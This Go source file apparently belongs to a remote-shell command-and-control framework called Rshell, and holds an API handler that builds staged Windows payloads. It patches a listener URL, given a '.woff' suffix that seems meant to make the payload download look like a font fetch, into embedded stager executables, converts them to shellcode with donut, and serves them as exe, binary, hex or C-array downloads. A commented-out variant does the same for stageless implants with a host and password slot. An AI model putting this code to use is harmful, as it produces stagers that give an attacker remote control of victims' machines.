package api

import (
	"Rshell/pkg/database"
	"Rshell/pkg/godonut"
	"Rshell/pkg/response"
	"bytes"
	"embed"
	"encoding/hex"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"strings"
	"unicode/utf16"
)

//	func StageLessShellCodeGen(c *gin.Context) {
//		var shellcode struct {
//			Listener string `json:"listener"`
//			Arch     string `json:"arch"`
//			Format   string `json:"format"`
//		}
//		if err := c.ShouldBind(&shellcode); err != nil {
//			c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
//		}
//		osType := "windows"
//		archType := shellcode.Arch
//
//		listenerTmp := strings.Split(shellcode.Listener, "://")
//		listenerType := listenerTmp[0]
//		connectAddress := listenerTmp[1]
//
//		// 查找符合条件的文件
//		binaryFileName := findBinary(listenerType, osType, archType)
//		if binaryFileName == "" {
//			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "未找到匹配的服务端文件"})
//		}
//		// 从嵌入的文件系统中读取对应文件内容
//		binaryData, err := embeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
//		if err != nil {
//			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "读取文件失败"})
//		}
//		var modifiedData []byte
//		if listenerType == "oss" {
//			// 替换文件中的特定字符串
//			oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
//			newStr := strings.ReplaceAll(connectAddress, " ", "")
//
//			tmp, _ := encrypt.Encrypt([]byte(newStr))
//			tmp2, _ := encrypt.EncodeBase64(tmp)
//			newStr = string(tmp2)
//
//			// 替换为的字符串
//			newStr = padRight(newStr, len(oldStr))
//
//			modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
//
//		} else {
//			// 替换文件中的特定字符串
//			oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
//			newStr := strings.ReplaceAll(connectAddress, " ", "")                // 替换为的字符串
//			newStr = padRight(newStr, len(oldStr))
//
//			modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
//		}
//		oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
//		newPass := padRight("", len(oldPass))
//		modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))
//		sc, _ := godonut.GenShellcode(modifiedData, "", shellcode.Arch)
//		var (
//			content  []byte
//			filename string
//			ctype    string
//		)
//
//		switch shellcode.Format {
//		case "bin":
//			content = sc
//			filename = "payload.bin"
//			ctype = "application/octet-stream"
//
//		case "hex":
//			hexStr := hex.EncodeToString(sc)
//			content = []byte(hexStr)
//			filename = "payload.txt"
//			ctype = "text/plain"
//
//		case "c":
//			var cBuilder bytes.Buffer
//			cBuilder.WriteString("unsigned char shellcode[] = \"")
//			for i, b := range sc {
//				if i == 0 {
//					cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
//				} else {
//					cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
//				}
//			}
//			cBuilder.WriteString("\";\n")
//			content = cBuilder.Bytes()
//			filename = "payload.c"
//			ctype = "text/x-csrc"
//
//		default:
//			c.String(http.StatusBadRequest, "不支持的格式: %s，支持 hex, c, bin", shellcode.Format)
//			return
//		}
//
//		// 设置下载响应头
//		c.Header("Content-Disposition", "attachment; filename="+filename)
//		c.Header("Content-Type", ctype)
//		c.Header("Content-Length", fmt.Sprintf("%d", len(content)))
//
//		c.Data(http.StatusOK, ctype, content)
//	}
//
//go:embed stageshellcode/*
var embeddedStager embed.FS // 嵌入 server 文件夹

// StageShellCodeGen generate stage shellcode
// @Summary Generate stage shellcode
// @Tags Shellcode
// @Accept json
// @Produce octet-stream
// @Param body body object true "{listener: listener URL, port: port, format: output format (exe/bin/hex/c)}"
// @Success 200 {file} binary "shellcode payload"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/shellcode/stage [post]
// @Security BearerAuth
func StageShellCodeGen(c *gin.Context) {
	var shellcode struct {
		Listener string `json:"listener"`
		Port     string `json:"port"`
		Format   string `json:"format"`
	}
	if err := c.ShouldBind(&shellcode); err != nil {
		response.BadRequest(c, err.Error())
		return
	}

	var wd database.WebDelivery
	database.Engine.Where("listening_port = ?", shellcode.Port).Get(&wd)

	connectUrl := wd.ServerAddress + ".woff"
	var binaryFileName string
	switch wd.Arch {
	case "386":
		binaryFileName = "stager_x86.exe"
	case "amd64":
		binaryFileName = "stager_x64.exe"
	}
	binaryData, err := embeddedStager.ReadFile("stageshellcode/" + binaryFileName)
	if err != nil {
		response.BadRequest(c, "Failed to read file")
		return
	}

	var modifiedData []byte

	oldStr := "URLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
	newStr := strings.ReplaceAll(connectUrl, " ", "")                                                                                                               // 替换为的字符串
	newStr = padRight(newStr, len(oldStr))
	oldBytes := utf16LE(oldStr)
	newBytes := utf16LE(newStr)
	modifiedData = bytes.ReplaceAll(binaryData, oldBytes, newBytes)

	sc, _ := godonut.GenShellcode(modifiedData, "", wd.Arch)
	var (
		content  []byte
		filename string
		ctype    string
	)

	switch shellcode.Format {
	case "exe":
		content = modifiedData
		ctype = "application/octet-stream"
		filename = binaryFileName
	case "bin":
		content = sc
		filename = "payload.bin"
		ctype = "application/octet-stream"

	case "hex":
		hexStr := hex.EncodeToString(sc)
		content = []byte(hexStr)
		filename = "payload.txt"
		ctype = "text/plain"

	case "c":
		var cBuilder bytes.Buffer
		cBuilder.WriteString("unsigned char shellcode[] = \"")
		for i, b := range sc {
			if i == 0 {
				cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
			} else {
				cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
			}
		}
		cBuilder.WriteString("\";\n")
		content = cBuilder.Bytes()
		filename = "payload.c"
		ctype = "text/x-csrc"

	default:
		response.BadRequest(c, fmt.Sprintf("不支持的格式: %s，支持 hex, c, bin", shellcode.Format))
		return
	}

	// 设置下载响应头
	c.Header("Content-Disposition", "attachment; filename="+filename)
	c.Header("Content-Type", ctype)
	c.Header("Content-Length", fmt.Sprintf("%d", len(content)))

	c.Data(http.StatusOK, ctype, content)
}
func utf16LE(s string) []byte {
	encoded := utf16.Encode([]rune(s))
	out := make([]byte, len(encoded)*2)
	for i, v := range encoded {
		out[i*2] = byte(v)        // 低字节
		out[i*2+1] = byte(v >> 8) // 高字节
	}
	return out
}
